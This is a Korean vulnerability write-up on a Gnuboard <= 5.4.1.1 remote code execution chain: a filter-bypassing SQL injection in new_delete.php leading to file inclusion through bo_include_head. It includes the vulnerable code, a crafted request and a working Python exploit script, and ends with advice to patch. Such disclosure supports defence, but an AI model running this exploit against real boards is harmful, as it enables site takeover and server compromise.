---
layout          : post
markdown        : kramdown
highlighter     : rouge
title           : Gnuboard <= 5.4.1.1 RCE
date            : 2021-02-08 16:00:00 +0900
category        : R&D
author          : 이예랑
author_email    : yllee@stealien.com
background      : /assets/bg.png
profile_image   : /assets/2021-02-08-Gnuboard-RCE/profile.jpg
summary         : Gnuboard <= 5.4.1.1 RCE
thumbnail       : /assets/bg.png
---

# Gnuboard <= 5.4.1.1 RCE
스틸리언 선임연구원 이예랑(yelang123)

## 개요
본 글에서는 찾은 뒤 제보하지 않아 잠수함 패치 된 `Gnuboard` 취약점의 대한 내용을 다룬다. 
해당 취약점은 관리자 페이지가 없어도 RCE가 가능하며 `Gnuboard` 게시판 관리자 이상의 권한에서 터지는 취약점이다.
보통 `Gnuboard`를 사용하는 실제 서비스에서 관리자 페이지의 취약점 등의 이유로 인하여 관리자 페이지의 경로를 바꾸거나 기타 다른 조치를 취하여 공격에 대해 사전에 방지한다.
해당 취약점을 이용하면 관리자 페이지의 경로를 모르거나 접근이 불가능 한 경우에도 RCE가 가능하다.

## 1. SQL Injection
```php
if (isset($_REQUEST['bo_table'])) {
    $bo_table = preg_replace('/[^a-z0-9_]/i', '', trim($_REQUEST['bo_table']));
    $bo_table = substr($bo_table, 0, 20);
} else {
    $bo_table = '';
}
```
우선 `Gnuboard` 는 `common.php 392 line` 에서 위와 같이 GET,POST 의 'bo_table' 파라미터의 데이터를 정규식으로 replace 한 뒤 글자수를 20 글자로 잘라 사용자의 입력을 제한한다.
위의 내용으로 인해 일반적인 방법으로 bo_table 파라미터를 이용한 SQL Injection은 불가능하다.
하지만 아래의 경우 이런 동작을 우회 할 수 있다.
```php
for($i=0;$i<count($_POST['chk_bn_id']);$i++)
{
    // 실제 번호를 넘김
    $k = $_POST['chk_bn_id'][$i];
    $bo_table = $_POST['bo_table'][$k];
    $wr_id    = $_POST['wr_id'][$k];
    $save_bo_table[] = $bo_table;
    $write_table = $g5['write_prefix'].$bo_table;
    if ($board['bo_table'] != $bo_table)
        $board = sql_fetch(" select bo_subject, bo_write_point, bo_comment_point, bo_notice from {$g5['board_table']} where bo_table = '$bo_table' ");
    $sql = " select * from $write_table where wr_id = '$wr_id' ";
    $write = sql_fetch($sql);
    if (!$write) continue;
```
`/bbs/new_delete.php 12~29 line` 에서 'chk_bn_id' 파라미터를 count하여 반복문을 통해 SELECT 하는것을 볼수 있다.
 방어기법이 적용된 입력값은 $bo_table에 적용된 반면에 이 코드에서 사용하고 있는 변수는 $_POST['bo_table']의 값을 가져와 `$bo_table`을 재정의 하기 때문에 `common.php`의 방어 코드는 실행되지 않는다.
 따라서 SQL Injection이 가능하다.

## Local FIle Inclusion
PHP 에서 Local File Inclusion 은 `include,require,include_once,require_once` 등의 함수의 인자를 다음과 같이 User input에서 컨트롤이 가능하다면 발생하는 취약점이다.
```php
<?php
$input = $_GET[1];
include $input;
?>
```
위와 같은 코드가 존재한다면 include 함수에서는 확장자의 영향을 받지 않기 때문에 파일의 내용을 쓸수 있는 경우 등 상황에 따라 RCE 가 가능하다.
```php
<?php
if (!defined('_GNUBOARD_')) exit; // 개별 페이지 접근 불가
// 게시판 관리의 상단 내용
if (G5_IS_MOBILE) {
    // 모바일의 경우 설정을 따르지 않는다.
    include_once(G5_BBS_PATH.'/_head.php');
    echo html_purifier(stripslashes($board['bo_mobile_content_head']));
} else {
    if(is_include_path_check($board['bo_include_head'])) {  //파일경로 체크
        @include ($board['bo_include_head']);
    } else {    //파일경로가 올바르지 않으면 기본파일을 가져옴
        include_once(G5_BBS_PATH.'/_head.php');
    }
    echo html_purifier(stripslashes($board['bo_content_head']));
}
?>
```
`/bbs/board_head.php 1~17 line` 을 보면 모바일 인지 체크 후  `$board['bo_include_head']` 의 값을 인자로 받아 include 함수를 실행한다.
```php
$write = array();
$write_table = "";
if ($bo_table) {
    $board = get_board_db($bo_table);
    if ($board['bo_table']) {
        set_cookie("ck_bo_table", $board['bo_table'], 86400 * 1);
        $gr_id = $board['gr_id'];
        $write_table = $g5['write_prefix'] . $bo_table; // 게시판 테이블 전체이름
        if (isset($wr_id) && $wr_id) {
            $write = get_write($write_table, $wr_id);
        } else if (isset($wr_seo_title) && $wr_seo_title) {
            $write = get_content_by_field($write_table, 'bbs', 'wr_seo_title', generate_seo_title($wr_seo_title));
            if( isset($write['wr_id']) ){
                $wr_id = $write['wr_id'];
            }
        }
    }
}
```
`/common.php 415~433 line` 을 보면 `get_board_db` 함수의 return 값을 $board 변수에 저장하고 그 후 다른 변수들의 값을 저장하는데 `get_board_db` 함수의 정의는 다음과 같다.
```php
function get_board_db($bo_table, $is_cache=false){
    global $g5;
    static $cache = array();
    $cache = run_replace('get_board_db_cache', $cache, $bo_table, $is_cache);
    $key = md5($bo_table);
    $bo_table = preg_replace('/[^a-z0-9_]/i', '', $bo_table);
    if( $is_cache && isset($cache[$key]) ){
        return $cache[$key];
    }
    if( !($cache[$key] = run_replace('get_board_db', array(), $bo_table)) ){
        $sql = " select * from {$g5['board_table']} where bo_table = '$bo_table' ";
        $cache[$key] = sql_fetch($sql);
    }
    return $cache[$key];
}
```
`/lib/get_data_lib.php 68~91 line` 을 보면 해당 함수는 `$bo_table` 을 인자로 받아 `g5_board` 테이블에서 select 해 그 결과를 변수에 저장한다.
따라서 `g5_board.bo_include_head` 필드의 내용을 실행하고 싶은 PHP 코드가 담긴 파일경로로 변경하면 RCE를 진행 할 수있다는 것이다.
## Exploit
```php
for($i=0;$i<count($_POST['chk_bn_id']);$i++)
{
    // 실제 번호를 넘김
    $k = $_POST['chk_bn_id'][$i];
    $bo_table = $_POST['bo_table'][$k];
    $wr_id    = $_POST['wr_id'][$k];
    $save_bo_table[] = $bo_table;
    $write_table = $g5['write_prefix'].$bo_table;
    if ($board['bo_table'] != $bo_table)
        $board = sql_fetch(" select bo_subject, bo_write_point, bo_comment_point, bo_notice from {$g5['board_table']} where bo_table = '$bo_table' ");
    $sql = " select * from $write_table where wr_id = '$wr_id' ";
    $write = sql_fetch($sql);
    if (!$write) continue;
    // 원글 삭제
    if ($write['wr_is_comment']==0)
    {
        $len = strlen($write['wr_reply']);
        if ($len < 0) $len = 0;
        $reply = substr($write['wr_reply'], 0, $len);
        // 나라오름님 수정 : 원글과 코멘트수가 정상적으로 업데이트 되지 않는 오류를 잡아 주셨습니다.
        $sql = " select wr_id, mb_id, wr_is_comment from $write_table where wr_parent = '{$write['wr_id']}' order by wr_id ";
        $result = sql_query($sql);
        while ($row = sql_fetch_array($result))
        { 
            // 원글이라면
            if (!$row['wr_is_comment'])
            {
```
`/bbs/new_delete.php 11~44 line` 을 보면 `$write_table` 변수의 저장된 값을 이용해 select 하여 1차 적인 select 에서의 SQL Injection이 가능하다. 
하지만 `RCE` 를 위한 `g5_board` 테이블의 값을 변조해야 하기 때문에 update clause 에서 SQL Injection 이 있어야 했고,  방법을 다음 코드에서 발견했다.
```php
else // 코멘트 삭제
    {
        //--------------------------------------------------------------------
        // 코멘트 삭제시 답변 코멘트 까지 삭제되지는 않음
        //--------------------------------------------------------------------
        //print_r2($write);
        $comment_id = $wr_id;
        $len = strlen($write['wr_comment_reply']);
        if ($len < 0) $len = 0;
        $comment_reply = substr($write['wr_comment_reply'], 0, $len);
        // 코멘트 삭제
        if (!delete_point($write['mb_id'], $bo_table, $comment_id, '코멘트')) {
            insert_point($write['mb_id'], $board['bo_comment_point'] * (-1), "{$board['bo_subject']} {$write['wr_parent']}-{$comment_id} 코멘트삭제");
        }
        // 코멘트 삭제
        sql_query(" delete from $write_table where wr_id = '$comment_id' ");
        // 코멘트가 삭제되므로 해당 게시물에 대한 최근 시간을 다시 얻는다.
        $sql = " select max(wr_datetime) as wr_last from $write_table where wr_parent = '{$write['wr_parent']}' ";
        $row = sql_fetch($sql);
        // 원글의 코멘트 숫자를 감소
        sql_query(" update $write_table set wr_comment = wr_comment - 1, wr_last = '{$row['wr_last']}' where wr_id = '{$write['wr_parent']}' ");
        // 코멘트 숫자 감소
        sql_query(" update {$g5['board_table']} set bo_count_comment = bo_count_comment - 1 where bo_table = '$bo_table' ");
        // 새글 삭제
        sql_query(" delete from {$g5['board_new_table']} where bo_table = '$bo_table' and wr_id = '$comment_id' ");
    }
}
```
`/bbs/new_delete.php 104~137 line`  을 보면 `$write` 변수
`sw=move&page=1&pressed=선택내용삭제&chk_bn_id[]=0&bo_table[0]=free as a join g5_board as b #&wr_id[0]=
where 1=0 union select (생략)-- -`
이와 같은 내용의 request 를 전송하면 다음과 같은 query 가 실행된다.
`1차 query`
```php
string(51) " select * from g5_write_free as a join g5_board as b# where wr_id = '
union select .....(생략) #' "
```
이 후 select 된 데이터의 `wr_is_comment` 컬럼의 내용을 확인하여 각각의 코드를 실행하는데 이 때 해당 값이 0 과 같지 않을 경우 다음과 같은 코드를 실행한다.
`2차 query`
```php
update $write_table set wr_comment = wr_comment - 1, wr_last = '{$row['wr_last']}' where wr_id = '{$write['wr_parent']}'
```
이 때 `$write` 변수에 저장되는 데이터의 값을 union 을 통해 적절히 조작하여 `update` 이후 부분을 자유롭게 조작할 수 있다.
 (그누보드는 파일 업로드 기능을 지원하고 실제 파일명을 `g5_board_file` 이라는 테이블에 저장하기 때문에 파일을 업로드 후 Local File Inclusion 취약점을 이용하여 Remote Code Execution이 가능)
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
cookie = '2a0d2363701f23f8a75028924a3af643=MTcyLjE2LjE1LjI1NA%3D%3D; PHPSESSID=atrem9p79ans05norgqsbqkpub; ck_font_resize_rmv_class=; ck_font_resize_add_class=; e1192aefb64683cc97abb83c71057733=dGVzdA%3D%3D'
attack_url = '172.16.15.254:1234/gnu/'
url = 'http://'+ attack_url + '/bbs/new_delete.php'
bo_table = 'free as a inner join g5_board as b#'
ex_board = 'free'
file_wr_id = '2'
file_bo_table = 'free'
update = '0x'+'''
set b.bo_include_head=(select concat('../data/file/','{0}/',(select bf_file from g5_board_file where wr_id='{1}' and bo_table='{0}'))) where b.bo_table='{2}' -- -'''.format(file_bo_table,file_wr_id,ex_board).encode('hex')
print update
wr_id = '''
where 1=0 union/*asdfasdfsadfsadfsa*/select
1,2,3,{},5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135-- -'''.format(update)
data = {'sw':'move',
        'pressed' : '선택내용삭제',
        'chk_bn_id[]' : '0',
        'bo_table[]' : bo_table,
        'wr_id[]' : wr_id}
headers = {'Cookie' : cookie}
r1 = requests.post(url,data=data,headers=headers)
print r1.text
```
## 결론
1. 보안 업데이트를 잘 하고, 개발자는 보안기법이 적용된 변수를 활용하자
2. 관리자 페이지에 취약점이 많다고 해서 결코 관리자 페이지에서만 취약점이 일어나지 않으니 주의를 기울이자